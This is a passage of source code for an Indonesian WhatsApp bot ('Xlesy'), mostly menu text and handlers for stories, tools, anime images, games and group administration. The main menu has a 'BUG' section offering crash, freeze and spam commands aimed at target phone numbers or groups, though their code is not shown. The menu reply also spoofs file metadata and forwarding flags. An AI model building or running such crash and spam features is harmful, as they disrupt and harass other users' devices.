│ ${setv} ${prefix}cerpen-gokil  
│ ${setv} ${prefix}cerpen-inspiratif  
│ ${setv} ${prefix}cerpen-jepang  
│ ${setv} ${prefix}cerpen-kehidupan  
│ ${setv} ${prefix}cerpen-keluarga  
│ ${setv} ${prefix}cerpen-kisahnyata  
│ ${setv} ${prefix}cerpen-korea  
│ ${setv} ${prefix}cerpen-kristen  
│ ${setv} ${prefix}cerpen-liburan  
│ ${setv} ${prefix}cerpen-malaysia  
│ ${setv} ${prefix}cerpen-mengharukan  
│ ${setv} ${prefix}cerpen-misteri  
│ ${setv} ${prefix}cerpen-motivasi  
│ ${setv} ${prefix}cerpen-nasihat  
│ ${setv} ${prefix}cerpen-nasionalisme  
│ ${setv} ${prefix}cerpen-olahraga  
│ ${setv} ${prefix}cerpen-patahhati  
│ ${setv} ${prefix}cerpen-penantian  
│ ${setv} ${prefix}cerpen-pendidikan  
│ ${setv} ${prefix}cerpen-pengalaman  
│ ${setv} ${prefix}cerpen-pengorbanan  
│ ${setv} ${prefix}cerpen-penyesalan  
│ ${setv} ${prefix}cerpen-perjuangan  
│ ${setv} ${prefix}cerpen-perpisahan  
│ ${setv} ${prefix}cerpen-persahabatan  
│ ${setv} ${prefix}cerpen-petualangan  
│ ${setv} ${prefix}cerpen-ramadhan  
│ ${setv} ${prefix}cerpen-remaja  
│ ${setv} ${prefix}cerpen-rindu  
│ ${setv} ${prefix}cerpen-rohani  
│ ${setv} ${prefix}cerpen-romantis  
│ ${setv} ${prefix}cerpen-sastra  
│ ${setv} ${prefix}cerpen-sedih  
│ ${setv} ${prefix}cerpen-sejarah  
╰─┬───┈➤
╭─┴─┈➤「 *\`TOOLS\`* 」❍
│ ${setv} ${prefix}get (url)
│ ${setv} ${prefix}hd (reply pesan)
│ ${setv} ${prefix}toaudio (reply pesan)
│ ${setv} ${prefix}tomp3 (reply pesan)
│ ${setv} ${prefix}tovn (reply pesan)
│ ${setv} ${prefix}toimage (reply pesan)
│ ${setv} ${prefix}toptv (reply pesan)
│ ${setv} ${prefix}tourl (reply pesan)
│ ${setv} ${prefix}tts (textnya)
│ ${setv} ${prefix}toqr (textnya)
│ ${setv} ${prefix}ssweb (url)
│ ${setv} ${prefix}enc
│ ${setv} ${prefix}githubtrend 
│ ${setv} ${prefix}breatanime (teks)
│ ${setv} ${prefix}brat (teks)
│ ${setv} ${prefix}bratvid (teks)
│ ${setv} ${prefix}sticker (send/reply img)
│ ${setv} ${prefix}colong (reply stiker)
│ ${setv} ${prefix}smeme (send/reply img)
│ ${setv} ${prefix}emojimix 🙃+💀
│ ${setv} ${prefix}nulis
│ ${setv} ${prefix}readmore text1|text2
│ ${setv} ${prefix}qc (pesannya)
│ ${setv} ${prefix}translate
│ ${setv} ${prefix}wasted (send/reply img)
│ ${setv} ${prefix}triggered (send/reply img)
│ ${setv} ${prefix}shorturl (urlnya)
│ ${setv} ${prefix}gitclone (urlnya)
│ ${setv} ${prefix}fat (reply audio)
│ ${setv} ${prefix}fast (reply audio)
│ ${setv} ${prefix}bass (reply audio)
│ ${setv} ${prefix}slow (reply audio)
│ ${setv} ${prefix}tupai (reply audio)
│ ${setv} ${prefix}deep (reply audio)
│ ${setv} ${prefix}robot (reply audio)
│ ${setv} ${prefix}blown (reply audio)
│ ${setv} ${prefix}reverse (reply audio)
│ ${setv} ${prefix}smooth (reply audio)
│ ${setv} ${prefix}earrape (reply audio)
│ ${setv} ${prefix}nightcore (reply audio)
│ ${setv} ${prefix}getexif (reply sticker)
╰─┬────┈➤
╭─┴─┈➤「 *\`AI\`* 」❍
│ ${setv} ${prefix}ai (query)
│ ${setv} ${prefix}simi (query)
│ ${setv} ${prefix}txt2img (query)
╰─┬────┈➤
╭─┴─┈➤「 *\`ANIME\`* 」❍
│ ${setv} ${prefix}waifu  
│ ${setv} ${prefix}neko    
│ ${setv} ${prefix}akira  
│ ${setv} ${prefix}akiyama  
│ ${setv} ${prefix}ana  
│ ${setv} ${prefix}art  
│ ${setv} ${prefix}asuna  
│ ${setv} ${prefix}ayuzawa  
│ ${setv} ${prefix}boruto  
│ ${setv} ${prefix}bts  
│ ${setv} ${prefix}chino  
│ ${setv} ${prefix}chitoge  
│ ${setv} ${prefix}cosplay  
│ ${setv} ${prefix}cosplayloli  
│ ${setv} ${prefix}cosplaysagiri  
│ ${setv} ${prefix}cyber  
│ ${setv} ${prefix}deidara  
│ ${setv} ${prefix}doraemon  
│ ${setv} ${prefix}elaina  
│ ${setv} ${prefix}emilia  
│ ${setv} ${prefix}erza  
│ ${setv} ${prefix}exo  
│ ${setv} ${prefix}gamewalpaper  
│ ${setv} ${prefix}gremoy  
│ ${setv} ${prefix}hacker  
│ ${setv} ${prefix}hestia  
│ ${setv} ${prefix}hinata  
│ ${setv} ${prefix}husbu  
│ ${setv} ${prefix}inori  
│ ${setv} ${prefix}islamic  
│ ${setv} ${prefix}isuzu  
│ ${setv} ${prefix}itachi  
│ ${setv} ${prefix}itori  
│ ${setv} ${prefix}jennie  
│ ${setv} ${prefix}jiso  
│ ${setv} ${prefix}justina  
│ ${setv} ${prefix}kaga  
│ ${setv} ${prefix}kagura  
│ ${setv} ${prefix}kakasih  
│ ${setv} ${prefix}kaori  
│ ${setv} ${prefix}cartoon  
│ ${setv} ${prefix}shortquete  
│ ${setv} ${prefix}kaneki  
│ ${setv} ${prefix}kotori  
│ ${setv} ${prefix}kurumi  
│ ${setv} ${prefix}lisa  
│ ${setv} ${prefix}madara  
│ ${setv} ${prefix}megumin  
│ ${setv} ${prefix}mikasa  
│ ${setv} ${prefix}mikey  
│ ${setv} ${prefix}miku  
│ ${setv} ${prefix}minato  
│ ${setv} ${prefix}mountain  
│ ${setv} ${prefix}naruto  
│ ${setv} ${prefix}neko2  
│ ${setv} ${prefix}nekoanime  
│ ${setv} ${prefix}nezuko  
│ ${setv} ${prefix}onepiece  
│ ${setv} ${prefix}pentol  
│ ${setv} ${prefix}pokemon  
│ ${setv} ${prefix}progaming  
│ ${setv} ${prefix}randomanime  
│ ${setv} ${prefix}randomanime2  
│ ${setv} ${prefix}rize  
│ ${setv} ${prefix}rose  
│ ${setv} ${prefix}sagiri  
│ ${setv} ${prefix}sakura  
│ ${setv} ${prefix}sasuke  
│ ${setv} ${prefix}satanic  
│ ${setv} ${prefix}shina  
│ ${setv} ${prefix}shinka  
│ ${setv} ${prefix}shinomiya  
│ ${setv} ${prefix}ahizuka  
│ ${setv} ${prefix}shota  
│ ${setv} ${prefix}space  
│ ${setv} ${prefix}tejina  
│ ${setv} ${prefix}tecnology  
│ ${setv} ${prefix}toukachan  
│ ${setv} ${prefix}sunade  
│ ${setv} ${prefix}yotsuba  
│ ${setv} ${prefix}yuki  
│ ${setv} ${prefix}yulibocil  
│ ${setv} ${prefix}yumekk  
╰─┬────┈➤
╭─┴─┈➤「 *\`MUSIC\`* 」❍ 
│ ${setv} ${prefix}music1
│ ${setv} ${prefix}music2
│ ${setv} ${prefix}music3
│ ${setv} ${prefix}music4
│ ${setv} ${prefix}music5
│ ${setv} ${prefix}music6
│ ${setv} ${prefix}music7
│ ${setv} ${prefix}music8
│ ${setv} ${prefix}music9
│ ${setv} ${prefix}music10
│ ${setv} ${prefix}playmusic (list menumusicnya)
╰─┬───┈➤
╭─┴─┈➤「 *\`GAME\`* 」❍
│ ${setv} ${prefix}tictactoe
│ ${setv} ${prefix}akinator
│ ${setv} ${prefix}suit
│ ${setv} ${prefix}slot
│ ${setv} ${prefix}math (level)
│ ${setv} ${prefix}begal
│ ${setv} ${prefix}casino (nominal)
│ ${setv} ${prefix}rampok (@tag)
│ ${setv} ${prefix}tekateki
│ ${setv} ${prefix}tebaklirik
│ ${setv} ${prefix}tebakkata
│ ${setv} ${prefix}tebakbom
│ ${setv} ${prefix}susunkata 
│ ${setv} ${prefix}tebakkimia
│ ${setv} ${prefix}caklontong
│ ${setv} ${prefix}tebaknegara
│ ${setv} ${prefix}tebakgambar
│ ${setv} ${prefix}tebakbendera
╰─┬────┈➤
╭─┴─┈➤「 *\`FUN\`* 」❍
│ ${setv} ${prefix}dadu
│ ${setv} ${prefix}bisakah (text)
│ ${setv} ${prefix}apakah (text)
│ ${setv} ${prefix}kapan (text)
│ ${setv} ${prefix}kerangajaib (text)
│ ${setv} ${prefix}cekmati (nama lu)
│ ${setv} ${prefix}ceksifat
│ ${setv} ${prefix}cekkhodam (nama lu)
│ ${setv} ${prefix}rate (reply pesan)
│ ${setv} ${prefix}jodohku
│ ${setv} ${prefix}jadian
│ ${setv} ${prefix}fitnah
│ ${setv} ${prefix}halah (text)
│ ${setv} ${prefix}hilih (text)
│ ${setv} ${prefix}huluh (text)
│ ${setv} ${prefix}heleh (text)
│ ${setv} ${prefix}holoh (text)
╰─┬────┈➤
╭─┴─┈➤「 *\`RANDOM\`* 」❍  
│ ${setv} ${prefix}coffe  
│ ${setv} ${prefix}cogan  
│ ${setv} ${prefix}cecan  
│ ${setv} ${prefix}jepang  
│ ${setv} ${prefix}korea  
│ ${setv} ${prefix}mobil  
│ ${setv} ${prefix}cina  
│ ${setv} ${prefix}vietnam  
╰─┬────┈➤
╭─┴─┈➤「 *\`BUG\`* 」❍    
│ ${setv} ${prefix}Crash-Force (628XXX)
│ ${setv} ${prefix}Force-Ui (628XXX)
│ ${setv} ${prefix}Force-Spam (628XXX) 
│ ${setv} ${prefix}Bugs-Force (628XXX)
│ ${setv} ${prefix}Freeze (linkgc/idgc)
│ ${setv} ${prefix}Bug-Ios (628XXX)
╰─┬────┈➤
╭─┴─┈➤「 *\`OWNER\`* 」❍
│ ${setv} ${prefix}bot [set]
│ ${setv} ${prefix}done
│ ${setv} ${prefix}setbio
│ ${setv} ${prefix}setppbot
│ ${setv} ${prefix}join
│ ${setv} ${prefix}leave
│ ${setv} ${prefix}leaveid
│ ${setv} ${prefix}block
│ ${setv} ${prefix}listblock
│ ${setv} ${prefix}openblock
│ ${setv} ${prefix}listpc
│ ${setv} ${prefix}listgcbot
│ ${setv} ${prefix}listgc
│ ${setv} ${prefix}replay (pesannya)
│ ${setv} ${prefix}replay1 (pesannya)
│ ${setv} ${prefix}notif
│ ${setv} ${prefix}creategc
│ ${setv} ${prefix}addprem
│ ${setv} ${prefix}delprem
│ ${setv} ${prefix}listprem
│ ${setv} ${prefix}addlimit
│ ${setv} ${prefix}adduang
│ ${setv} ${prefix}bot --settings
│ ${setv} ${prefix}bot settings
│ ${setv} ${prefix}restartbot 
│ ${setv} ${prefix}getsession
│ ${setv} ${prefix}delsession
│ ${setv} ${prefix}delsampah
│ ${setv} ${prefix}upsw
╰─────┈➤
`
				await m.reply({
					document: fake.docs,
					fileName: ucapanWaktu,
					mimetype: pickRandom(fake.listfakedocs),
					fileLength: '100000000000000',
					pageCount: '999',
					caption: menunya,
					contextInfo: {
						mentionedJid: [m.sender, '0@s.whatsapp.net', owner[0] + '@s.whatsapp.net'],
						forwardingScore: 10,
						isForwarded: true,
						forwardedNewsletterMessageInfo: {
							newsletterJid: my.ch,
							serverMessageId: null,
							newsletterName: 'Xlesy FOR INFO'
						},
						externalAdReply: {
							title: author,
							body: packname,
							showAdAttribution: true,
							thumbnailUrl: profile,
							mediaType: 1,
							previewType: 0,
							renderLargerThumbnail: true,
							mediaUrl: my.gh,
							sourceUrl: my.gh,
						}}}, { quoted: ftroli })
			await Xlesy.sendMessage(m.chat, { react: { text: '✅', key: m.key } })	
			}		
			break
			//MENU-MENU
            case 'botmenu': {
                await Xlesy.sendMessage(m.chat, { react: { text: '⏳', key: m.key } })
    let imagePath = './lib/media/image/menu2.jpg' // Path ke gambar lokal

    let textMessage = `❍───❍「 _*Xlesy Menuya*_  」❍───❍ 
╭─┴─┈➤「 *BOT MENU* 」❍
│ ${setv} ${prefix}claim
│ ${setv} ${prefix}buy [item] (nominal)
│ ${setv} ${prefix}transfer
│ ${setv} ${prefix}leaderboard
│ ${setv} ${prefix}request (text)
│ ${setv} ${prefix}react (emoji)
│ ${setv} ${prefix}tagme
│ ${setv} ${prefix}runtime
│ ${setv} ${prefix}totalfitur
│ ${setv} ${prefix}ping
│ ${setv} ${prefix}afk
│ ${setv} ${prefix}rvo (reply pesan viewone)
│ ${setv} ${prefix}inspect (url gc)
│ ${setv} ${prefix}addmsg
│ ${setv} ${prefix}delmsg
│ ${setv} ${prefix}getmsg
│ ${setv} ${prefix}listmsg
│ ${setv} ${prefix}q (reply pesan)
│ ${setv} ${prefix}menfes (62xxx|fake name)
│ ${setv} ${prefix}jadibot
│ ${setv} ${prefix}stopjadibot
│ ${setv} ${prefix}listjadibot
│ ${setv} ${prefix}jasajadibot
│ ${setv} ${prefix}sewa
│ ${setv} ${prefix}donasi
│ ${setv} ${prefix}pay
│ ${setv} ${prefix}apkytprem
╰─────┈➤
`
    let buttons = [
        { buttonId: ".menu", buttonText: { displayText: "Back To Menu" }, type: 1 }
    ]

    // Kirim gambar lokal + teks + tombol
    await Xlesy.sendButtonMsg(m.chat, {
        image: { url: imagePath }, // Menggunakan file lokal
        text: textMessage,
        footer: 'XlesyVIP',
        buttons: buttons
    }, { quoted: ftroli })
    await Xlesy.sendMessage(m.chat, { react: { text: '✅', key: m.key } })
        }
            break

case 'groupmenu': {
    await Xlesy.sendMessage(m.chat, { react: { text: '⏳', key: m.key } }) 
    let imagePath = './lib/media/image/menu2.jpg' // Path ke gambar lokal

    let textMessage = `❍───❍「 _*Xlesy Menuya*_  」❍───❍
╭────┈➤「 *GROUP MENU* 」❍
│ ${setv} ${prefix}add (62xxx)
│ ${setv} ${prefix}kick (@tag/62xxx)
│ ${setv} ${prefix}promote (@tag/62xxx)
│ ${setv} ${prefix}demote (@tag/62xxx)
│ ${setv} ${prefix}setname (nama baru gc)
│ ${setv} ${prefix}setdesc (desk)
│ ${setv} ${prefix}setppgc (reply imgnya)
│ ${setv} ${prefix}delete (reply pesan)
│ ${setv} ${prefix}linkgrup
│ ${setv} ${prefix}revoke
│ ${setv} ${prefix}tagall
│ ${setv} ${prefix}hidetag
│ ${setv} ${prefix}totag (reply pesan)
│ ${setv} ${prefix}listonline
│ ${setv} ${prefix}group set
╰──────┈➤
`
        let buttons = [
        { buttonId: ".menu", buttonText: { displayText: "Back To Menu" }, type: 1 }
    ]

    // Kirim gambar lokal + teks + tombol
    await Xlesy.sendButtonMsg(m.chat, {
        image: { url: imagePath }, // Menggunakan file lokal
        text: textMessage,
        footer: 'XlesyVIP',
        buttons: buttons
    }, { quoted: ftroli })
    await Xlesy.sendMessage(m.chat, { react: { text: '✅', key: m.key } })
        }
            break
case 'searchmenu': {
    await Xlesy.sendMessage(m.chat, { react: { text: '⏳', key: m.key } })
    let imagePath = './lib/media/image/menu2.jpg' // Path ke gambar lokal

    let textMessage = `❍───❍「 _*Xlesy Menuya*_  」❍───❍
╭─────┈➤「 *SEARCH MENU * 」❍
│ ${setv} ${prefix}ytsearch (query)
│ ${setv} ${prefix}pixiv (query)
│ ${setv} ${prefix}pinterest (query)
│ ${setv} ${prefix}wallpaper (query)
│ ${setv} ${prefix}ringtone (query)
│ ${setv} ${prefix}google (query)
│ ${setv} ${prefix}gimage (query)
│ ${setv} ${prefix}npm (query)
│ ${setv} ${prefix}style (query)
│ ${setv} ${prefix}searchgroup (nama_group)
│ ${setv} ${prefix}ig (url akun ig)
│ ${setv} ${prefix}waktudunia
│ ${setv} ${prefix}cuaca (kota)
│ ${setv} ${prefix}animecari (judul)
│ ${setv} ${prefix}mlnews
╰─────┈➤
`
        let buttons = [
        { buttonId: ".menu", buttonText: { displayText: "Back To Menu" }, type: 1 }
    ]

    // Kirim gambar lokal + teks + tombol
    await Xlesy.sendButtonMsg(m.chat, {
        image: { url: imagePath }, // Menggunakan file lokal
        text: textMessage,
        footer: 'XlesyVIP',
        buttons: buttons
    }, { quoted: ftroli })
    await Xlesy.sendMessage(m.chat, { react: { text: '✅', key: m.key } })
        }
            break
case 'downloadmenu': {
    await Xlesy.sendMessage(m.chat, { react: { text: '⏳', key: m.key } })
    let imagePath = './lib/media/image/menu2.jpg' // Path ke gambar lokal

    let textMessage = `❍───❍「 _*Xlesy Menuya*_  」❍───❍
╭───┈➤「 *DOWNLOAD MENU* 」❍
│ ${setv} ${prefix}ytmp3 (url)
│ ${setv} ${prefix}ytmp4 (url)
│ ${setv} ${prefix}instagram (url)
│ ${setv} ${prefix}tiktok (url)
│ ${setv} ${prefix}facebook (url)
│ ${setv} ${prefix}spotifydl (url)
│ ${setv} ${prefix}mediafire (url)
╰──────┈➤
`
        let buttons = [
        { buttonId: ".menu", buttonText: { displayText: "Back To Menu" }, type: 1 }
    ]

    // Kirim gambar lokal + teks + tombol
    await Xlesy.sendButtonMsg(m.chat, {
        image: { url: imagePath }, // Menggunakan file lokal
        text: textMessage,
        footer: 'XlesyVIP',
        buttons: buttons
    }, { quoted: ftroli })
    await Xlesy.sendMessage(m.chat, { react: { text: '✅', key: m.key } })
        }
            break
case 'quotesmenu': {
    await Xlesy.sendMessage(m.chat, { react: { text: '⏳', key: m.key } })
    let imagePath = './lib/media/image/menu2.jpg' // Path ke gambar lokal

    let textMessage = `❍───❍「 _*Xlesy Menuya*_  」❍───❍ 
╭──┈➤「 *QUOTES MENU* 」❍
│ ${setv} ${prefix}motivasi
│ ${setv} ${prefix}quotes
│ ${setv} ${prefix}quotesIslamic 
│ ${setv} ${prefix}quotessad
│ ${setv} ${prefix}truth
│ ${setv} ${prefix}renungan
╰─────┈➤
`
        let buttons = [
        { buttonId: ".menu", buttonText: { displayText: "Back To Menu" }, type: 1 }
    ]

    // Kirim gambar lokal + teks + tombol
    await Xlesy.sendButtonMsg(m.chat, {
        image: { url: imagePath }, // Menggunakan file lokal
        text: textMessage,
        footer: 'XlesyVIP',
        buttons: buttons
    }, { quoted: ftroli })
    await Xlesy.sendMessage(m.chat, { react: { text: '✅', key: m.key } })
        }
            break
case 'libraymenu': {
    await Xlesy.sendMessage(m.chat, { react: { text: '⏳', key: m.key } })
    let imagePath = './lib/media/image/menu2.jpg' // Path ke gambar lokal

    let textMessage = `❍───❍「 _*Xlesy Menuya*_  」❍───❍ 
╭──┈➤「 *LIBRAY MENU* 」❍  
│ ${setv} ${prefix}cerpen-anak  
│ ${setv} ${prefix}cerpen-bahasadaerah  
│ ${setv} ${prefix}cerpen-bahasainggris  
│ ${setv} ${prefix}cerpen-bahasajawa  
│ ${setv} ${prefix}cerpen-bahasasunda  
│ ${setv} ${prefix}cerpen-budaya  
│ ${setv} ${prefix}cerpen-cinta  
│ ${setv} ${prefix}cerpen-cintaislami  
│ ${setv} ${prefix}cerpen-cintapertama  
│ ${setv} ${prefix}cerpen-cintaromantis  
│ ${setv} ${prefix}cerpen-cintasedih  
│ ${setv} ${prefix}cerpen-cintasegitiga  
│ ${setv} ${prefix}cerpen-cintasejati  
│ ${setv} ${prefix}cerpen-galau  
│ ${setv} ${prefix}cerpen-gokil  
│ ${setv} ${prefix}cerpen-inspiratif  
│ ${setv} ${prefix}cerpen-jepang  
│ ${setv} ${prefix}cerpen-kehidupan  
│ ${setv} ${prefix}cerpen-keluarga  
│ ${setv} ${prefix}cerpen-kisahnyata  
│ ${setv} ${prefix}cerpen-korea  
│ ${setv} ${prefix}cerpen-kristen  
│ ${setv} ${prefix}cerpen-liburan  
│ ${setv} ${prefix}cerpen-malaysia  
│ ${setv} ${prefix}cerpen-mengharukan  
│ ${setv} ${prefix}cerpen-misteri  
│ ${setv} ${prefix}cerpen-motivasi  
│ ${setv} ${prefix}cerpen-nasihat  
│ ${setv} ${prefix}cerpen-nasionalisme  
│ ${setv} ${prefix}cerpen-olahraga  
│ ${setv} ${prefix}cerpen-patahhati  
│ ${setv} ${prefix}cerpen-penantian  
│ ${setv} ${prefix}cerpen-pendidikan  
│ ${setv} ${prefix}cerpen-pengalaman  
│ ${setv} ${prefix}cerpen-pengorbanan  
│ ${setv} ${prefix}cerpen-penyesalan  
│ ${setv} ${prefix}cerpen-perjuangan  
│ ${setv} ${prefix}cerpen-perpisahan  
│ ${setv} ${prefix}cerpen-persahabatan  
│ ${setv} ${prefix}cerpen-petualangan  
│ ${setv} ${prefix}cerpen-ramadhan  
│ ${setv} ${prefix}cerpen-remaja  
│ ${setv} ${prefix}cerpen-rindu  
│ ${setv} ${prefix}cerpen-rohani  
│ ${setv} ${prefix}cerpen-romantis  
│ ${setv} ${prefix}cerpen-sastra  
│ ${setv} ${prefix}cerpen-sedih  
│ ${setv} ${prefix}cerpen-sejarah  
╰─────┈➤
`
    let buttons = [
        { buttonId: ".menu", buttonText: { displayText: "Back To Menu" }, type: 1 }
    ]

    // Kirim gambar lokal + teks + tombol
    await Xlesy.sendButtonMsg(m.chat, {
        image: { url: imagePath }, // Menggunakan file lokal
        text: textMessage,
        footer: 'XlesyVIP',
        buttons: buttons
    }, { quoted: ftroli })
    await Xlesy.sendMessage(m.chat, { react: { text: '✅', key: m.key } })
        }
            break
case 'toolsmenu': {
    await Xlesy.sendMessage(m.chat, { react: { text: '⏳', key: m.key } })
    let imagePath = './lib/media/image/menu2.jpg' // Path ke gambar lokal

    let textMessage = `❍───❍「 _*Xlesy Menuya*_  」❍───❍ 
╭─┴─┈➤「 *TOOLS* 」❍
│ ${setv} ${prefix}get (url)
│ ${setv} ${prefix}hd (reply pesan)
│ ${setv} ${prefix}toaudio (reply pesan)
│ ${setv} ${prefix}tomp3 (reply pesan)
│ ${setv} ${prefix}tovn (reply pesan)
│ ${setv} ${prefix}toimage (reply pesan)
│ ${setv} ${prefix}toptv (reply pesan)
│ ${setv} ${prefix}tourl (reply pesan)
│ ${setv} ${prefix}tts (textnya)
│ ${setv} ${prefix}toqr (textnya)
│ ${setv} ${prefix}ssweb (url)
│ ${setv} ${prefix}enc
│ ${setv} ${prefix}githubtrend 
│ ${setv} ${prefix}sticker (send/reply img)
│ ${setv} ${prefix}breatanime (teks)
│ ${setv} ${prefix}brat (teks)
│ ${setv} ${prefix}bratvid (teks)
│ ${setv} ${prefix}colong (reply stiker)
│ ${setv} ${prefix}smeme (send/reply img)
│ ${setv} ${prefix}emojimix 🙃+💀
│ ${setv} ${prefix}nulis
│ ${setv} ${prefix}readmore text1|text2
│ ${setv} ${prefix}qc (pesannya)
│ ${setv} ${prefix}translate
│ ${setv} ${prefix}wasted (send/reply img)
│ ${setv} ${prefix}triggered (send/reply img)
│ ${setv} ${prefix}shorturl (urlnya)
│ ${setv} ${prefix}gitclone (urlnya)
│ ${setv} ${prefix}fat (reply audio)
│ ${setv} ${prefix}fast (reply audio)
│ ${setv} ${prefix}bass (reply audio)
│ ${setv} ${prefix}slow (reply audio)
│ ${setv} ${prefix}tupai (reply audio)
│ ${setv} ${prefix}deep (reply audio)
│ ${setv} ${prefix}robot (reply audio)
│ ${setv} ${prefix}blown (reply audio)
│ ${setv} ${prefix}reverse (reply audio)
│ ${setv} ${prefix}smooth (reply audio)
│ ${setv} ${prefix}earrape (reply audio)
│ ${setv} ${prefix}nightcore (reply audio)
│ ${setv} ${prefix}getexif (reply sticker)
╰─────┈➤
`
    let buttons = [
        { buttonId: ".menu", buttonText: { displayText: "Back To Menu" }, type: 1 }
    ]

    // Kirim gambar lokal + teks + tombol
    await Xlesy.sendButtonMsg(m.chat, {
        image: { url: imagePath }, // Menggunakan file lokal
        text: textMessage,
        footer: 'XlesyVIP',
        buttons: buttons
    }, { quoted: ftroli })
    await Xlesy.sendMessage(m.chat, { react: { text: '✅', key: m.key } })
        }
            break
case 'aimenu': {
    await Xlesy.sendMessage(m.chat, { react: { text: '⏳', key: m.key } })
    let imagePath = './lib/media/image/menu2.jpg' // Path ke gambar lokal

    let textMessage = `❍───❍「 _*Xlesy Menuya*_  」❍───❍ 
  ╭──┈➤「 *AI* 」❍ 
  │ ${setv} ${prefix}ai (query) 
  │ ${setv} ${prefix}simi (query) 
  │ ${setv} ${prefix}txt2img (query) 
  ╰─────┈➤
 `
        let buttons = [
        { buttonId: ".menu", buttonText: { displayText: "Back To Menu" }, type: 1 }
    ]

    // Kirim gambar lokal + teks + tombol
    await Xlesy.sendButtonMsg(m.chat, {
        image: { url: imagePath }, // Menggunakan file lokal
        text: textMessage,
        footer: 'XlesyVIP',
        buttons: buttons
    }, { quoted: ftroli })
    await Xlesy.sendMessage(m.chat, { react: { text: '✅', key: m.key } })
        }
            break
case 'animemenu': {
    await Xlesy.sendMessage(m.chat, { react: { text: '⏳', key: m.key } })
    let imagePath = './lib/media/image/menu2.jpg' // Path ke gambar lokal

    let textMessage = `❍───❍「 _*Xlesy Menuya*_  」❍───❍ 
╭───┈➤「 *ANIME MENU* 」❍  
│ ${setv} ${prefix}waifu  
│ ${setv} ${prefix}neko  
│ ${setv} ${prefix}akira  
│ ${setv} ${prefix}akiyama  
│ ${setv} ${prefix}ana  
│ ${setv} ${prefix}art  
│ ${setv} ${prefix}asuna  
│ ${setv} ${prefix}ayuzawa  
│ ${setv} ${prefix}boruto  
│ ${setv} ${prefix}bts  
│ ${setv} ${prefix}chino  
│ ${setv} ${prefix}chitoge  
│ ${setv} ${prefix}cosplay  
│ ${setv} ${prefix}cosplayloli  
│ ${setv} ${prefix}cosplaysagiri  
│ ${setv} ${prefix}cyber  
│ ${setv} ${prefix}deidara  
│ ${setv} ${prefix}doraemon  
│ ${setv} ${prefix}elaina  
│ ${setv} ${prefix}emilia  
│ ${setv} ${prefix}erza  
│ ${setv} ${prefix}exo  
│ ${setv} ${prefix}gamewalpaper  
│ ${setv} ${prefix}gremoy  
│ ${setv} ${prefix}hacker  
│ ${setv} ${prefix}hestia  
│ ${setv} ${prefix}hinata  
│ ${setv} ${prefix}husbu  
│ ${setv} ${prefix}inori  
│ ${setv} ${prefix}islamic  
│ ${setv} ${prefix}isuzu  
│ ${setv} ${prefix}itachi  
│ ${setv} ${prefix}itori  
│ ${setv} ${prefix}jennie  
│ ${setv} ${prefix}jiso  
│ ${setv} ${prefix}justina  
│ ${setv} ${prefix}kaga  
│ ${setv} ${prefix}kagura  
│ ${setv} ${prefix}kakasih  
│ ${setv} ${prefix}kaori  
│ ${setv} ${prefix}cartoon  
│ ${setv} ${prefix}shortquete  
│ ${setv} ${prefix}kaneki  
│ ${setv} ${prefix}kotori  
│ ${setv} ${prefix}kurumi  
│ ${setv} ${prefix}lisa  
│ ${setv} ${prefix}madara  
│ ${setv} ${prefix}megumin  
│ ${setv} ${prefix}mikasa  
│ ${setv} ${prefix}mikey  
│ ${setv} ${prefix}miku  
│ ${setv} ${prefix}minato  
│ ${setv} ${prefix}mountain  
│ ${setv} ${prefix}naruto  
│ ${setv} ${prefix}neko2  
│ ${setv} ${prefix}nekoanime  
│ ${setv} ${prefix}nezuko  
│ ${setv} ${prefix}onepiece  
│ ${setv} ${prefix}pentol  
│ ${setv} ${prefix}pokemon  
│ ${setv} ${prefix}progaming  
│ ${setv} ${prefix}randomanime  
│ ${setv} ${prefix}randomanime2  
│ ${setv} ${prefix}rize  
│ ${setv} ${prefix}rose  
│ ${setv} ${prefix}sagiri  
│ ${setv} ${prefix}sakura  
│ ${setv} ${prefix}sasuke  
│ ${setv} ${prefix}satanic  
│ ${setv} ${prefix}shina  
│ ${setv} ${prefix}shinka  
│ ${setv} ${prefix}shinomiya  
│ ${setv} ${prefix}ahizuka  
│ ${setv} ${prefix}shota  
│ ${setv} ${prefix}space  
│ ${setv} ${prefix}tejina  
│ ${setv} ${prefix}tecnology  
│ ${setv} ${prefix}toukachan  
│ ${setv} ${prefix}sunade  
│ ${setv} ${prefix}yotsuba  
│ ${setv} ${prefix}yuki  
│ ${setv} ${prefix}yulibocil  
│ ${setv} ${prefix}yumekk  
╰─────┈➤
`
        let buttons = [
        { buttonId: ".menu", buttonText: { displayText: "Back To Menu" }, type: 1 }
    ]

    // Kirim gambar lokal + teks + tombol
    await Xlesy.sendButtonMsg(m.chat, {
        image: { url: imagePath }, // Menggunakan file lokal
        text: textMessage,
        footer: 'XlesyVIP',
        buttons: buttons
    }, { quoted: ftroli })
    await Xlesy.sendMessage(m.chat, { react: { text: '✅', key: m.key } })
        }
            break
case 'gamemenu': {
    await Xlesy.sendMessage(m.chat, { react: { text: '⏳', key: m.key } })
    let imagePath = './lib/media/image/menu2.jpg' // Path ke gambar lokal

    let textMessage = `❍───❍「 _*Xlesy Menuya*_  」❍───❍
╭──┈➤「 *GAME* 」❍
│ ${setv} ${prefix}tictactoe
│ ${setv} ${prefix}akinator
│ ${setv} ${prefix}suit
│ ${setv} ${prefix}slot
│ ${setv} ${prefix}math (level)
│ ${setv} ${prefix}begal
│ ${setv} ${prefix}casino (nominal)
│ ${setv} ${prefix}rampok (@tag)
│ ${setv} ${prefix}tekateki
│ ${setv} ${prefix}tebaklirik
│ ${setv} ${prefix}tebakkata
│ ${setv} ${prefix}tebakbom
│ ${setv} ${prefix}susunkata
│ ${setv} ${prefix}tebakkimia
│ ${setv} ${prefix}caklontong
│ ${setv} ${prefix}tebaknegara
│ ${setv} ${prefix}tebakgambar
│ ${setv} ${prefix}tebakbendera
╰─────┈➤
`
        let buttons = [
        { buttonId: ".menu", buttonText: { displayText: "Back To Menu" }, type: 1 }
    ]

    // Kirim gambar lokal + teks + tombol
    await Xlesy.sendButtonMsg(m.chat, {
        image: { url: imagePath }, // Menggunakan file lokal
        text: textMessage,
        footer: 'XlesyVIP',
        buttons: buttons
    }, { quoted: ftroli })
    await Xlesy.sendMessage(m.chat, { react: { text: '✅', key: m.key } })
        }
            break
case 'funmenu': {
    await Xlesy.sendMessage(m.chat, { react: { text: '⏳', key: m.key } })
    let imagePath = './lib/media/image/menu2.jpg' // Path ke gambar lokal

    let textMessage = `❍───❍「 _*Xlesy Menuya*_  」❍───❍ 
╭──┈➤「 *FUN* 」❍
│ ${setv} ${prefix}dadu
